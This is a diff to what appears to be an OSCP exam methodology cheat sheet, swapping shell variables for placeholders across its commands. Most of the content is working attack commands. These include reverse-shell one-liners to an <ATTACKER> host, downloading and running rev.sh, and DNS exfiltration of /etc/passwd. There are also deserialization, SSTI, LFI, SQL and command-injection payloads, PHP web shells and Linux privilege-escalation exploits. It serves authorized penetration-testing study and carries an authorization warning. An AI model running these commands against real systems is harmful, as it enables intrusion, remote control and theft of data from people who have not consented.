@@ -13,8 +13,8 @@ tags = ['oscp', 'methodology', 'commands']
 
 ## How to use this page
 
-1. **Copy the [Variables](#variables) block** into the shell you will use for the engagement. Every command below assumes those names are exported.
-2. **Replace every `<placeholder>`** in angle brackets (`<share>`, `<svc>`, `<template>`, `<CA-NAME>`) and any quoted value that is obviously not yours.
+1. **Replace the placeholders** (`<IP>`, `<USER>`, `<PASS>`, `<DOMAIN>`, `<DC>`, `<ATTACKER>`, `<LPORT>`) in the line you run. Nothing is exported; the page has no environment to set up.
+2. **Replace every other `<placeholder>`** as well (`<share>`, `<svc>`, `<template>`, `<CA-NAME>`) and any quoted value that is obviously not yours.
 3. **Check the precondition** in front of the command — credentials, an open port, a session, a synced clock. Most "broken" commands on this page are a missing precondition, not a wrong flag.
 4. **Run one step at a time and read the output.** The checkboxes are ordered by cost, not importance; skip the ones whose precondition is absent and record why.
 5. **Confirm the flag on your install** when a tool changes often: `nxc --help`, `certipy req -h`, `impacket-GetUserSPNs -h`, `hashcat --example-hashes`.
@@ -27,38 +27,31 @@ When a tool changes a flag, update every copy of the line.
 These are **templates, not fire-and-forget**. Anything that writes, resets, configures or coerces can break the target: `sc config`, `certipy template`, `setuserinfo2`, `ntlmrelayx`, `xp_cmdshell`, `diskshadow`, `reg save`, and every password reset need the authorization and rollback plan from [Phase 0](/notes/oscp-labs/methodology/). On shared lab infrastructure, prefer read-only proof and revert what you change.
 {{< /hint >}}
 
-## Variables
+## Placeholders and wordlists
 
-```bash
-# --- engagement context: export once per shell, re-export after a VPN reconnect
-export IP="<target-ip>"                 # single host under test
-export DOMAIN="<domain>"                # AD DNS name, e.g. sequel.htb
-export DC="<dc-ip-or-fqdn>"             # domain controller
-export USER="<username>"                # current / assumed-breach account
-export PASS='<password>'                # single quotes keep $ ! and backticks literal
-export HASH="<ntlm-hash>"               # NT half only, no LM half, no colons
-export ATTACKER="<tun0-ip>"             # your reachable address: ip -4 addr show tun0
-export LPORT="443"                      # 443/80/53 survive most egress filters
-export WORDLIST="/usr/share/wordlists/rockyou.txt"
-```
+Every command below uses angle-bracket placeholders — `<IP>`, `<USER>`, `<PASS>`,
+`<DOMAIN>`, `<DC>`, `<ATTACKER>`, `<LPORT>`, `<WORDLIST>`. Replace them in the line;
+there is nothing to export and no shell setup to remember.
 
+The wordlists worth having on disk (use these paths wherever a command shows
+`<WORDLIST>`, `<DIRLIST>`, `<VHOSTLIST>` or `<USERS>`, or substitute your own):
 ```bash
-# --- wordlists used below (optional, saves typing)
-export DIRLIST="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
-export VHOSTLIST="/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"
-export USERS="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
-# some builds ship the dir list as DirBuster-2007_directory-list-2.3-medium.txt:
+/usr/share/wordlists/rockyou.txt                                          # WORDLIST
+/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt   # DIRLIST
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt        # VHOSTLIST
+/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt           # USERS
+# some builds ship the dir list under the old name:
 ls /usr/share/seclists/Discovery/Web-Content/ | grep -i directory-list
 ```
 
 ```bash
 # --- name resolution: one line per host/vhost, never rewrite existing lines
-echo "$IP $DOMAIN dc01.$DOMAIN" | sudo tee -a /etc/hosts
+echo "<IP> <DOMAIN> dc01.<DOMAIN>" | sudo tee -a /etc/hosts
 # a discovered vhost points at the same IP:
-echo "$IP wiki.$DOMAIN" | sudo tee -a /etc/hosts
+echo "<IP> wiki.<DOMAIN>" | sudo tee -a /etc/hosts
 ```
 
-> `USER` shadows your login name inside this shell only. If a tool misbehaves after exporting it, run that tool in a fresh shell. Keep `"$USER"` in double quotes so names with spaces survive.
+> `USER` shadows your login name inside this shell only. If a tool misbehaves after exporting it, run that tool in a fresh shell. Keep `"<USER>"` in double quotes so names with spaces survive.
 
 ## 0. Engagement / exam workflow
 
@@ -79,16 +72,16 @@ Timebox a 24-hour exam as four blocks. The split is the default; move time, neve
 
 ```bash
 mkdir -p engagement/{hosts,evidence,loot}
-script -q -f "engagement/hosts/$IP.log"
-date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/$IP.md"
+script -q -f "engagement/hosts/<IP>.log"
+date -u +"%Y-%m-%dT%H:%M:%SZ" | tee -a "engagement/hosts/<IP>.md"
 ```
 
 ```bash
 # keep output: tee everything that produces a finding (after the port list exists, section 1)
-nmap -sCV -Pn -n -p"$PORTS" "$IP" -oA "engagement/hosts/$IP/nmap" | tee -a "engagement/hosts/$IP.md"
-ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -ac -o "engagement/hosts/$IP/ffuf.json" -of json
+nmap -sCV -Pn -n -p"<PORTS>" "<IP>" -oA "engagement/hosts/<IP>/nmap" | tee -a "engagement/hosts/<IP>.md"
+ffuf -u "http://<IP>/FUZZ" -w "<DIRLIST>" -ac -o "engagement/hosts/<IP>/ffuf.json" -of json
 # screenshot with a timestamp in the name (import = ImageMagick, needs X)
-import -window root "engagement/evidence/$(date +%Y-%m-%d_%H%M)_$IP.png"
+import -window root "engagement/evidence/$(date +%Y-%m-%d_%H%M)_<IP>.png"
 sha256sum engagement/evidence/*.png >> engagement/evidence/hashes.txt
 ```
 
@@ -106,7 +99,7 @@ sha256sum engagement/evidence/*.png >> engagement/evidence/hashes.txt
 id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null
 ip -4 addr show tun0 | grep inet; ip route
 sudo -V 2>/dev/null | head -1
-date -u; ntpdate -q "$DC" 2>/dev/null | head -1     # for AD targets only
+date -u; ntpdate -q "<DC>" 2>/dev/null | head -1     # for AD targets only
 cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
 ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup 2>/dev/null | head -3
 realm list 2>/dev/null; ps aux | grep -E 'sssd|winbind' | grep -v grep
@@ -116,124 +109,124 @@ realm list 2>/dev/null; ps aux | grep -E 'sssd|winbind' | grep -v grep
 
 - [ ] **TCP passes** — top-1000 now, full sweep in parallel; derive `PORTS` from the full scan.
 ```bash
-sudo nmap -sCV -Pn -n --top-ports 1000 -T4 -oA nmap-top "$IP" &
-sudo nmap -sS -Pn -n -p- --min-rate 5000 --max-retries 1 -oA nmap-all "$IP"
+sudo nmap -sCV -Pn -n --top-ports 1000 -T4 -oA nmap-top "<IP>" &
+sudo nmap -sS -Pn -n -p- --min-rate 5000 --max-retries 1 -oA nmap-all "<IP>"
 export PORTS="$(grep -oE '^[0-9]+/tcp +open' nmap-all.nmap | cut -d/ -f1 | paste -sd,)"
-echo "$PORTS"
+echo "<PORTS>"
 ```
 
 - [ ] **Versions + targeted NSE** — only against the ports that are actually open.
 ```bash
-sudo nmap -sCV -Pn -n -p"$PORTS" --version-all -oA nmap-svc "$IP"
-nmap -Pn -n -p"$PORTS" --script "http-title,http-headers,http-git,ssl-cert,smb-os-discovery,smb2-security-mode,ftp-anon,nfs-showmount" "$IP"
+sudo nmap -sCV -Pn -n -p"<PORTS>" --version-all -oA nmap-svc "<IP>"
+nmap -Pn -n -p"<PORTS>" --script "http-title,http-headers,http-git,ssl-cert,smb-os-discovery,smb2-security-mode,ftp-anon,nfs-showmount" "<IP>"
 ```
 
 - [ ] **UDP** — 161, 69, 123, 53, 623 are missed by TCP-only scans.
 ```bash
-sudo nmap -sU -Pn -n --top-ports 50 --open --min-rate 1000 -oA nmap-udp "$IP"
-sudo nmap -sU -Pn -n -p161 --script snmp-info,snmp-brute "$IP"
+sudo nmap -sU -Pn -n --top-ports 50 --open --min-rate 1000 -oA nmap-udp "<IP>"
+sudo nmap -sU -Pn -n -p161 --script snmp-info,snmp-brute "<IP>"
 ```
 
 - [ ] **Hosts file** — before any vhost work; verify with a name-based request.
 ```bash
-printf '%s %s %s\n' "$IP" "$DOMAIN" "dc01.$DOMAIN" | sudo tee -a /etc/hosts
-curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://$DOMAIN/"
+printf '%s %s %s\n' "<IP>" "<DOMAIN>" "dc01.<DOMAIN>" | sudo tee -a /etc/hosts
+curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "http://<DOMAIN>/"
 ```
 
 - [ ] **Vhost discovery** — the IP root is frequently a decoy; calibrate against a random Host header.
 ```bash
-curl -s -o /dev/null -w '%{size_download}\n' -H "Host: $(head -c6 /dev/urandom | base64 | tr -d '/+=').$DOMAIN" "http://$IP/"
-ffuf -u "http://$IP" -H "Host: FUZZ.$DOMAIN" -w "$VHOSTLIST" -ac
-gobuster vhost -u "http://$IP" -w "$VHOSTLIST" --append-domain --domain "$DOMAIN" --exclude-length <baseline-length>
+curl -s -o /dev/null -w '%{size_download}\n' -H "Host: $(head -c6 /dev/urandom | base64 | tr -d '/+=').<DOMAIN>" "http://<IP>/"
+ffuf -u "http://<IP>" -H "Host: FUZZ.<DOMAIN>" -w "<VHOSTLIST>" -ac
+gobuster vhost -u "http://<IP>" -w "<VHOSTLIST>" --append-domain --domain "<DOMAIN>" --exclude-length <baseline-length>
 ```
 
 - [ ] **Web fingerprint** — headers, title, generator, TLS SANs, WAF.
 ```bash
-curl -sI "http://$IP/"; whatweb -a 3 "http://$IP" -v
-nmap -Pn -n -p443 --script ssl-cert "$IP"
-openssl s_client -connect "$IP:443" -servername "$DOMAIN" </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'
-wafw00f "http://$IP"
+curl -sI "http://<IP>/"; whatweb -a 3 "http://<IP>" -v
+nmap -Pn -n -p443 --script ssl-cert "<IP>"
+openssl s_client -connect "<IP>:443" -servername "<DOMAIN>" </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'
+wafw00f "http://<IP>"
 ```
 
 - [ ] **Content discovery** — extensions from what you observed, not a generic list.
 ```bash
-ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -e .php,.txt,.html,.bak,.old,.zip -ac -t 60
-feroxbuster -u "http://$IP" -w "$DIRLIST" -x php,txt,html -d 2 -C 404
+ffuf -u "http://<IP>/FUZZ" -w "<DIRLIST>" -e .php,.txt,.html,.bak,.old,.zip -ac -t 60
+feroxbuster -u "http://<IP>" -w "<DIRLIST>" -x php,txt,html -d 2 -C 404
 ```
 
 - [ ] **`.git`, backups, and exposed secrets** — the fastest win on a web host and the most-missed by automated scanners.
 ```bash
-git-dumper "http://$IP/.git" ./dumped-repo 2>/dev/null
+git-dumper "http://<IP>/.git" ./dumped-repo 2>/dev/null
 cd dumped-repo && git log -p --all | head -200; git diff --cached
 gitleaks detect --source . --verbose 2>/dev/null
 trufflehog filesystem . --only-verified --no-update 2>/dev/null
-curl -s "http://$IP/.env"; curl -s "http://$IP/backup.zip" -o backup.zip && unzip -l backup.zip
+curl -s "http://<IP>/.env"; curl -s "http://<IP>/backup.zip" -o backup.zip && unzip -l backup.zip
 ```
 
 - [ ] **SMB** — null, guest, shares, signing; try a second tool before declaring SMB closed.
 ```bash
-smbclient -N -L "//$IP"
-nxc smb "$IP" -u '' -p '' --shares
-smbmap -H "$IP" -u "$USER" -p "$PASS" -r <share>
-smbclient "//$IP/<share>" -U "$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
-smbclient -N "//$IP/IPC\$" -c 'ls'                 # Named-pipe probe
+smbclient -N -L "//<IP>"
+nxc smb "<IP>" -u '' -p '' --shares
+smbmap -H "<IP>" -u "<USER>" -p "<PASS>" -r <share>
+smbclient "//<IP>/<share>" -U "<USER>%<PASS>" -c 'recurse ON; prompt OFF; mget *'
+smbclient -N "//<IP>/IPC\$" -c 'ls'                 # Named-pipe probe
 ```
 
 - [ ] **RPC / user enumeration** — valid users before any spraying.
 ```bash
-rpcclient -U "" -N "$IP" -c "enumdomusers;enumdomgroups;querydominfo"
-rpcclient -U "" -N "$IP" -c "netshareenumall"
-nxc smb "$IP" -u '' -p '' --rid-brute
-enum4linux-ng -A "$IP" -oA "engagement/hosts/$IP/enum4linux"
+rpcclient -U "" -N "<IP>" -c "enumdomusers;enumdomgroups;querydominfo"
+rpcclient -U "" -N "<IP>" -c "netshareenumall"
+nxc smb "<IP>" -u '' -p '' --rid-brute
+enum4linux-ng -A "<IP>" -oA "engagement/hosts/<IP>/enum4linux"
 ```
 
 - [ ] **LDAP** — only if 389/636/3268 is open; anonymous bind first, then credentials.
 ```bash
-ldapsearch -x -H "ldap://$DC" -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
-nxc ldap "$DC" -u "$USER" -p "$PASS" --users --groups
-ldapsearch -x -H "ldap://$DC" -b "DC=<domain>,DC=<tld>" "(objectClass=*)"
+ldapsearch -x -H "ldap://<DC>" -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName
+nxc ldap "<DC>" -u "<USER>" -p "<PASS>" --users --groups
+ldapsearch -x -H "ldap://<DC>" -b "DC=<domain>,DC=<tld>" "(objectClass=*)"
 ```
 
 - [ ] **SNMP** — walk to a file, then read process command lines; that is where passwords are.
 ```bash
-snmpbulkwalk -v2c -c public -Cr1000 "$IP" .1 | tee "engagement/hosts/$IP/snmp.txt"
-snmpwalk -v2c -c public "$IP" 1.3.6.1.2.1.25.4.2.1.5 | grep -iE 'pass|pwd|login|token|user'
-snmp-check "$IP" -c public -v 2c
-onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "$IP"
+snmpbulkwalk -v2c -c public -Cr1000 "<IP>" .1 | tee "engagement/hosts/<IP>/snmp.txt"
+snmpwalk -v2c -c public "<IP>" 1.3.6.1.2.1.25.4.2.1.5 | grep -iE 'pass|pwd|login|token|user'
+snmp-check "<IP>" -c public -v 2c
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt "<IP>"
 ```
 
 - [ ] **NFS** — `showmount` output is a credential source, not just a file share.
 ```bash
-showmount -e "$IP"
-sudo mkdir -p /mnt/nfs && sudo mount -t nfs "$IP":/srv/nfs /mnt/nfs -o nolock
+showmount -e "<IP>"
+sudo mkdir -p /mnt/nfs && sudo mount -t nfs "<IP>":/srv/nfs /mnt/nfs -o nolock
 find /mnt/nfs -name '*.sql' -o -name '*.env' -o -name 'id_rsa' 2>/dev/null
 ```
 
 - [ ] **FTP** — anonymous first, then banner/version.
 ```bash
-nmap -Pn -n -p21 --script ftp-anon,ftp-syst "$IP"
-wget -m --no-passive "ftp://anonymous:anonymous@$IP/"
+nmap -Pn -n -p21 --script ftp-anon,ftp-syst "<IP>"
+wget -m --no-passive "ftp://anonymous:anonymous@<IP>/"
 ```
 
 - [ ] **DNS** — zone transfer, subdomains, PTR; a DC almost always has 53 open.
 ```bash
-dig axfr "$DOMAIN" @"$DC"; dig +short -x "$IP"
-gobuster dns -d "$DOMAIN" -w "$VHOSTLIST" --resolver "$DC" -q
+dig axfr "<DOMAIN>" @"<DC>"; dig +short -x "<IP>"
+gobuster dns -d "<DOMAIN>" -w "<VHOSTLIST>" --resolver "<DC>" -q
 ```
 
 - [ ] **MSSQL / MySQL** — instance info, weak auth, then queries.
 ```bash
-nxc mssql "$IP" -u "$USER" -p "$PASS" --local-auth
-impacket-mssqlclient "$DOMAIN/$USER:$PASS@$IP" -windows-auth
-mysql -h "$IP" -u "$USER" -p"$PASS" -e 'SELECT @@version, @@secure_file_priv, user();'
+nxc mssql "<IP>" -u "<USER>" -p "<PASS>" --local-auth
+impacket-mssqlclient "<DOMAIN>/<USER>:<PASS>@<IP>" -windows-auth
+mysql -h "<IP>" -u "<USER>" -p"<PASS>" -e 'SELECT @@version, @@secure_file_priv, user();'
 ```
 
 - [ ] **RDP / WinRM** — 3389/5985/5986 are shells when the account is allowed.
 ```bash
-nmap -Pn -n -p3389 --script rdp-enum-encryption,rdp-ntlm-info "$IP"
-nxc winrm "$IP" -u "$USER" -p "$PASS"
-evil-winrm -i "$IP" -u "$USER" -p "$PASS"
-xfreerdp /v:"$IP" /u:"$USER" /p:"$PASS" /cert:ignore /dynamic-resolution +clipboard
+nmap -Pn -n -p3389 --script rdp-enum-encryption,rdp-ntlm-info "<IP>"
+nxc winrm "<IP>" -u "<USER>" -p "<PASS>"
+evil-winrm -i "<IP>" -u "<USER>" -p "<PASS>"
+xfreerdp /v:"<IP>" /u:"<USER>" /p:"<PASS>" /cert:ignore /dynamic-resolution +clipboard
 ```
 
 - [ ] **Cloud metadata** — try every provider on any host that might be a cloud VM.
@@ -256,8 +249,8 @@ cat /proc/self/status | grep -i cap
 
 - [ ] **Web ports beyond 80/443** — every open HTTP port gets the full web workflow, not a single `curl -I`.
 ```bash
-for p in $(echo "$PORTS" | tr ',' '\n'); do
-  curl -s -o /dev/null -w "port $p: %{http_code} %{content_type}\n" "http://$IP:$p/" 2>/dev/null
+for p in $(echo "<PORTS>" | tr ',' '\n'); do
+  curl -s -o /dev/null -w "port $p: %{http_code} %{content_type}\n" "http://<IP>:$p/" 2>/dev/null
 done
 ```
 
@@ -265,81 +258,81 @@ done
 
 - [ ] **Directories first** — one calibrated run, then recurse only where the app is interesting.
 ```bash
-ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -e .php,.txt,.html,.js -ac -t 60
-ffuf -u "http://$IP/FUZZ" -w "$DIRLIST" -recursion -recursion-depth 2 -e .php -ac
-gobuster dir -u "http://$IP" -w "$DIRLIST" -x php,txt,html -t 40
+ffuf -u "http://<IP>/FUZZ" -w "<DIRLIST>" -e .php,.txt,.html,.js -ac -t 60
+ffuf -u "http://<IP>/FUZZ" -w "<DIRLIST>" -recursion -recursion-depth 2 -e .php -ac
+gobuster dir -u "http://<IP>" -w "<DIRLIST>" -x php,txt,html -t 40
 ```
 
 - [ ] **Vhosts and subdomains** — repeat against every name you find.
 ```bash
-ffuf -u "http://$IP" -H "Host: FUZZ.$DOMAIN" -w "$VHOSTLIST" -mc all -ac
-gobuster vhost -u "http://$DOMAIN" -w "$VHOSTLIST" --append-domain
+ffuf -u "http://<IP>" -H "Host: FUZZ.<DOMAIN>" -w "<VHOSTLIST>" -mc all -ac
+gobuster vhost -u "http://<DOMAIN>" -w "<VHOSTLIST>" --append-domain
 ```
 
 - [ ] **Parameter discovery** — GET names, then POST bodies.
 ```bash
-ffuf -u "http://$IP/index.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw <baseline>
-ffuf -u "http://$IP/login" -X POST -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fw <baseline>
-arjun -u "http://$IP/api/users" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+ffuf -u "http://<IP>/index.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fw <baseline>
+ffuf -u "http://<IP>/login" -X POST -d 'FUZZ=value' -H 'Content-Type: application/x-www-form-urlencoded' -fw <baseline>
+arjun -u "http://<IP>/api/users" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 ```
 
 - [ ] **Upload tests** — change one control at a time: name, extension, Content-Type, magic bytes.
 ```bash
-curl -s -F 'file=@shell.php;type=image/png;filename=shell.php.png' "http://$IP/upload.php"
-curl -s -F 'file=@shell.php;type=image/png;filename=shell.php%00.png' "http://$IP/upload.php"
+curl -s -F 'file=@shell.php;type=image/png;filename=shell.php.png' "http://<IP>/upload.php"
+curl -s -F 'file=@shell.php;type=image/png;filename=shell.php%00.png' "http://<IP>/upload.php"
 printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php.png
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' img.jpg -o polyglot.php
 ```
 
 - [ ] **LFI checks** — traversal, filters, wrappers, then code execution.
 ```bash
-curl -s "http://$IP/index.php?page=../../../../etc/passwd"
-curl -s "http://$IP/index.php?page=....//....//....//etc/passwd"
-curl -s "http://$IP/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
-curl -s "http://$IP/index.php?page=/var/log/apache2/access.log&cmd=id" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
+curl -s "http://<IP>/index.php?page=../../../../etc/passwd"
+curl -s "http://<IP>/index.php?page=....//....//....//etc/passwd"
+curl -s "http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
+curl -s "http://<IP>/index.php?page=/var/log/apache2/access.log&cmd=id" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
 ```
 
 - [ ] **SQLi quick tests** — quote, comment, arithmetic, time; hand it to sqlmap only when manual works.
 ```bash
-curl -s "http://$IP/item.php?id=1'"; curl -s "http://$IP/item.php?id=1%27%20--%20-"
-curl -s "http://$IP/item.php?id=1%20AND%201=2"
-curl -s -w '\n%{time_total}\n' "http://$IP/item.php?id=1'%20OR%20SLEEP(5)--%20-"
+curl -s "http://<IP>/item.php?id=1'"; curl -s "http://<IP>/item.php?id=1%27%20--%20-"
+curl -s "http://<IP>/item.php?id=1%20AND%201=2"
+curl -s -w '\n%{time_total}\n' "http://<IP>/item.php?id=1'%20OR%20SLEEP(5)--%20-"
 sqlmap -r request.txt --batch --level 3 --risk 2 --technique=BEU --dbms=<db>
 ```
 
 - [ ] **Command injection** — separators, then space/character bypasses, then out-of-band.
 ```bash
-curl -s "http://$IP/ping.php?ip=127.0.0.1;id"
-curl -s "http://$IP/ping.php?ip=127.0.0.1%0aid"; curl -s "http://$IP/ping.php?ip=127.0.0.1|id"
-curl -s "http://$IP/ping.php?ip=127.0.0.1\$(id)"; curl -s "http://$IP/ping.php?ip=127.0.0.1%3Bcat\${IFS}/etc/passwd"
+curl -s "http://<IP>/ping.php?ip=127.0.0.1;id"
+curl -s "http://<IP>/ping.php?ip=127.0.0.1%0aid"; curl -s "http://<IP>/ping.php?ip=127.0.0.1|id"
+curl -s "http://<IP>/ping.php?ip=127.0.0.1\$(id)"; curl -s "http://<IP>/ping.php?ip=127.0.0.1%3Bcat\${IFS}/etc/passwd"
 ```
 
 - [ ] **SSRF** — loopback, metadata, alternate schemes, then internal services.
 ```bash
-curl -s -X POST "http://$IP/fetch" -d 'url=http://127.0.0.1:80/'
-curl -s -X POST "http://$IP/fetch" -d 'url=http://169.254.169.254/latest/meta-data/'
-curl -s -X POST "http://$IP/fetch" -d 'url=file:///etc/passwd'
+curl -s -X POST "http://<IP>/fetch" -d 'url=http://127.0.0.1:80/'
+curl -s -X POST "http://<IP>/fetch" -d 'url=http://169.254.169.254/latest/meta-data/'
+curl -s -X POST "http://<IP>/fetch" -d 'url=file:///etc/passwd'
 ```
 
 - [ ] **SSTI** — confirm with arithmetic, identify the engine, then a documented gadget.
 ```bash
-curl -s "http://$IP/?name=\${7*7}"; curl -s "http://$IP/?name={{7*7}}"; curl -s "http://$IP/?name=<%=7*7%>"
-curl -s "http://$IP/?name={{config}}"
-curl -s "http://$IP/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"                    # Jinja2
-curl -s "http://$IP/?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"  # FreeMarker
+curl -s "http://<IP>/?name=\${7*7}"; curl -s "http://<IP>/?name={{7*7}}"; curl -s "http://<IP>/?name=<%=7*7%>"
+curl -s "http://<IP>/?name={{config}}"
+curl -s "http://<IP>/?name={{cycler.__init__.__globals__.os.popen('id').read()}}"                    # Jinja2
+curl -s "http://<IP>/?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>\${ex(\"id\")}"  # FreeMarker
 ```
 
 - [ ] **JWT** — decode, tamper, then crack; check `alg`, `kid`, `jku`.
 ```bash
 cut -d. -f2 <<< "<jwt>" | tr '_-' '/+' | base64 -d 2>/dev/null
 jwt_tool.py "<jwt>" -M at
-jwt_tool.py "<jwt>" -C -d "$WORDLIST"
-hashcat -m 16500 jwt.txt "$WORDLIST"
+jwt_tool.py "<jwt>" -C -d "<WORDLIST>"
+hashcat -m 16500 jwt.txt "<WORDLIST>"
 ```
 
 - [ ] **Deserialization** — only when the app carries a serialized blob (cookie, view state, parameter).
 ```bash
-java -jar ysoserial.jar CommonsCollections1 "curl http://$ATTACKER/x" | base64 -w0
+java -jar ysoserial.jar CommonsCollections1 "curl http://<ATTACKER>/x" | base64 -w0
 phpggc -l; phpggc Monolog/RCE1 system id -b
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c whoami" -o base64
 ```
@@ -355,7 +348,7 @@ const { chromium } = require('playwright');
   await p.goto(process.argv[2]); await b.close();
 })();
 EOF
-node /tmp/xss.js "http://$IP/vuln?q=<img src=x onerror=alert(document.domain)>"
+node /tmp/xss.js "http://<IP>/vuln?q=<img src=x onerror=alert(document.domain)>"
 ```
 
 **If X, try Y** — 403 means the path exists (try `.bak`, `/.git/`, `OPTIONS`, trailing slash). No vhost hits → read the TLS SAN and page source. Upload rejected → extension, then Content-Type, then magic bytes, then `.htaccess`/`web.config`. `..` filtered → `....//` or an absolute path; Windows needs `\windows\win.ini`. SQLi quotes blocked → numeric context or JSON body. `{{7*7}}` renders → engine fingerprint, then gadget. JWT `none` rejected → weak HS256 secret, `kid` injection, `jku`. No deserialization gadget → base64 cookie is the usual carrier.
@@ -364,22 +357,22 @@ node /tmp/xss.js "http://$IP/vuln?q=<img src=x onerror=alert(document.domain)>"
 
 - [ ] **Listener** — `rlwrap` first; a raw `nc` shell hides tab completion and Ctrl-C.
 ```bash
-rlwrap -cAr nc -lvnp "$LPORT"
+rlwrap -cAr nc -lvnp "<LPORT>"
 socat -d -d TCP-LISTEN:4444 STDOUT
 ```
 
 - [ ] **Metasploit handler** — when a staged payload or module needs one.
 ```bash
-msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST $ATTACKER; set LPORT $LPORT; run"
-msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $ATTACKER; set LPORT $LPORT; run"
+msfconsole -q -x "use multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"
+msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST <ATTACKER>; set LPORT <LPORT>; run"
 ```
 
 - [ ] **One-liners** — pick the interpreter the target actually has.
 ```bash
-bash -i >& /dev/tcp/"$ATTACKER"/"$LPORT" 0>&1
-python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$ATTACKER',$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"
-php -r "\$sock=fsockopen('$ATTACKER',$LPORT);exec('/bin/sh -i <&3 >&3 2>&3');"
-rm -f /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc "$ATTACKER" "$LPORT" 1>/tmp/p
+bash -i >& /dev/tcp/"<ATTACKER>"/"<LPORT>" 0>&1
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('<ATTACKER>',<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(['/bin/sh','-i'])"
+php -r "\$sock=fsockopen('<ATTACKER>',<LPORT>);exec('/bin/sh -i <&3 >&3 2>&3');"
+rm -f /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc "<ATTACKER>" "<LPORT>" 1>/tmp/p
 ```
 
 ```powershell
@@ -397,8 +390,8 @@ export TERM=xterm; export SHELL=/bin/bash; stty rows 40 cols 120
 
 - [ ] **Download to the target** — stage a file, then execute it; `curl | bash` dies in Java/PHP contexts.
 ```bash
-wget "http://$ATTACKER/linpeas.sh" -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
-curl -s "http://$ATTACKER/rev.sh" -o /tmp/rev.sh && bash /tmp/rev.sh
+wget "http://<ATTACKER>/linpeas.sh" -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
+curl -s "http://<ATTACKER>/rev.sh" -o /tmp/rev.sh && bash /tmp/rev.sh
 ```
 
 ```powershell
@@ -439,7 +432,7 @@ base64 -w0 file.bin > file.b64 && base64 -d file.b64 > file.bin
 # On the attacker host: capture DNS
 sudo tcpdump -ni tun0 -s0 port 53
 # On target: encode chunked
-base64 -w0 /etc/passwd | fold -w63 | while read c; do host "$c.exfil.$DOMAIN" >/dev/null; done
+base64 -w0 /etc/passwd | fold -w63 | while read c; do host "$c.exfil.<DOMAIN>" >/dev/null; done
 ```
 
 ## 4. Linux privilege escalation
@@ -456,7 +449,7 @@ sudo -l | grep -E 'NOPASSWD|SETENV|env_keep|!authenticate'
 sudo -u <user> /bin/bash                    # (scriptmanager : scriptmanager) NOPASSWD: ALL
 sudo -u#-1 /bin/bash                        # CVE-2019-14287, sudo < 1.8.28 only
 sudo --chroot=/tmp /bin/true                # CVE-2025-32463, sudo 1.9.14–1.9.17: nsswitch LPE
-echo "$PASS" | sudo -S <cmd>                # rule is not NOPASSWD
+echo "<PASS>" | sudo -S <cmd>                # rule is not NOPASSWD
 ```
 
 - [ ] **GTFOBins** — substitute the binary `sudo -l` allows.
@@ -523,8 +516,8 @@ ls -la /etc/ld.so.preload 2>/dev/null && echo '/tmp/x.so' > /etc/ld.so.preload
 
 - [ ] **NFS** — a writable `no_root_squash` export is an instant root.
 ```bash
-showmount -e "$IP"
-sudo mount -t nfs "$IP":/tmp /mnt/nfs -o nolock
+showmount -e "<IP>"
+sudo mount -t nfs "<IP>":/tmp /mnt/nfs -o nolock
 cp /bin/bash /mnt/nfs/rootbash && sudo chown root:root /mnt/nfs/rootbash && sudo chmod 4755 /mnt/nfs/rootbash
 /tmp/rootbash -p
 ```
@@ -603,7 +596,7 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 
